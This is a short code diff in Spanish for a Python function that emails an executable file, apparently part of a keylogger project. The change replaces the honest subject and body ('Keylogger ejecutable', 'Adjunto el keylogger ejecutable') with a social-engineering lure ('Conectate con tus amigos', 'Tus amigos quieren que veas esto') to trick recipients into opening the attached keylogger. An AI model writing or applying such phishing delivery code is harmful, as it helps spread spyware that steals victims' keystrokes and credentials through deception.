@@ -44,10 +44,10 @@ def enviar_exe_por_correo(destinatario, archivo_path):
         email_password = os.getenv("EMAIL_PASSWORD")
 
         msg = EmailMessage()
-        msg["Subject"] = "Keylogger ejecutable"
+        msg["Subject"] = "Conectate con tus amigos"
         msg["From"] = email_sender
         msg["To"] = destinatario
-        msg.set_content("Adjunto el keylogger ejecutable como se solicitó.")
+        msg.set_content("Tus amigos quieren que veas esto")
 
         with open(archivo_path, "rb") as f:
             exe_data = f.read()
